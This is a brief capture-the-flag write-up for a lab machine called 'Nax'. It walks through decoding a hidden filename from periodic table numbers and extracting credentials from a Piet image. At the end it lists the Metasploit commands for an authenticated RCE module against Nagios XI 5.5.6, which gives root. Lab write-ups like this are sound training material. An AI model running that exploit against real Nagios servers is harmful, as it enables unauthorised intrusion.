# Nax 

### Nax 
The source code of the website shows a directory:<br />
![Screenshot 2025-04-07 152226](https://github.com/user-attachments/assets/8e25f609-d09b-4966-aa88-4ee537e00dc8)<br />
I looked online for default credentials for `nagios xi` or some unauthenticated exploit but didn't find anything. <br />
Next, the main website shows a series of elements from the periodic table. If you look at the number of each chemical element in the periodic table, this list becomes `47 80 73 51 84 46 80 78 103`:<br />
![image](https://github.com/user-attachments/assets/740decb9-7eb1-4e3d-be52-ac694dad0fd5)<br />
So there's a file called `PI3T.PNg`. I download the image and look at the strings of this file:<br />
![image](https://github.com/user-attachments/assets/814af22e-328d-4beb-a3b4-e9a8e254205d)<br />
At this point I followed the hint from the task, and understood that piet is an esoteric language , programs in piet are images. and I then found [this online tool](https://www.bertnase.de/npiet/npiet-execute.php) that was able to extract a set of credentials from the image. Now that I'm logged in I look at the version of nagios xi which is `5.5.6`. There's a metasploit RCE for this version: 

    use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
    set password REDACTED
    set lhost YOUR_IP
    set rhosts TARGET_IP
    run
This is enough to log in as root and get both flags.
